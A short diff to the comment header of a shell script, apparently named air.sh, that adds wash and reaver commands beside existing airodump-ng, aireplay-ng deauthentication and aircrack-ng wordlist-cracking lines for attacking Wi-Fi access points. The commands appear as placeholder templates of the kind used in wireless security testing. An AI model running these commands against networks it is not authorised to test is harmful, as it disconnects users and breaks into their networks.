@@ -5,6 +5,8 @@
 # airodump-ng -c <channel - no hopping> --bssid <mac of ap> --write <file> wlanXmon 
 # aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon
 # aircrack-ng <file.cap> -w <wordlist>
+# wash -i wlanXmon
+# reaver -i wlanXmon 00:00:00:00:00:00 -vv
 
 # usage ./air.sh <input file>
 # input file list of MAC addresses
